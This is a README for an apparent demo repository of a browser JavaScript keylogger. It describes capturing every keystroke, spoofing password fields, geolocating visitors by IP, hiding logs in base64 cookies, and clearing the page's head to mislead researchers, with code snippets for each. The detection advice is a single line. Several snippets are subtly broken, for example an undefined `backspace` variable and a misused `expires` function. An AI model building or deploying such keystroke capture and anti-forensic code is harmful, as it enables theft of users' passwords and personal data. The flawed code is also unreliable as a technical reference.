Javascript Keylogging
===

A repo with code illustrating the ease of writing keylogger in javascript.

**Why make this repo?**

Javascript is exploding. A lot of people like using ES6 with a transpiler, so ES5 and 'browser' js is less prevalent. Most people don't realize how much access to the client machine the browser gives the developer. This repo was me exploring that.

---

### What is the attack?

This is a very, very simple attack. It just goes to show it's not about the code, it's about the usage.

  * Logs all key inputs
  * Spoofs a real password field with text
  * Handles special keys (ALT, SHIFT, ENTER, etc) for easy readability 
  * Capture client IP and return location data, estimate exact location
  * Base64 encode the keylogs
  * Save all user data in base64 encoded cookie

### Examples

  * Example 1 - basic, barebones usage of the script
  * Example 2 - realistic order form for plane ticket
  * Example 3 - event based listening and logging

### How to detect?

  * **Use the JS profiler in DevTools** - check out the dev tools.



**Basic Keylogger**

```js
document.onKeyDown(function(e) {
  // IE
  e = e || event;
  // handle backspace
  if (e.key === backspace) {
    keys.length === 0 ? null : keys = keys.slice(0,-1) 
    } else if (modifierKeys.includes(e.key)) { null } else {
    keys.push(e.key);
  }
  // log keys, handle nil
  keys.length === 0 ? console.log('no keys, backspace') : console.log(keys.join(''))
})
```

**Get User Information**

```js
// Can replace with any IP tool of preference 
// -> empty callback for JSONP
$.getJSON('http://freegeoip.net/json/?callback=?', function(data) {
  console.log(JSON.stringify(data, null, 2));
});
```

**Clear the <HEAD> of Website**

Potentially smart attack to provide misleading source code to researchers.

```js
// Clear the HEAD tag of the website
function clearHead() {
  const _head = document.getElementsByTagName("head")[0];
  _head.innerHTML = ""
  // inject fake code
}

```

**Save cookie**

Save all the data to a cookie

```js
// calculate expiration for cookie
// @param days: integer
function expires(days) {
  var _date = new Date();
  var date = _date.setTime(_date.getTime() + (days*24*60*60*1000));
  return date.toUTCString();
}

var val = "foo=bar;"
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));

var expires = "expires=" + expires() + ";";
document.cookie = val + expires + "path=/;";
```


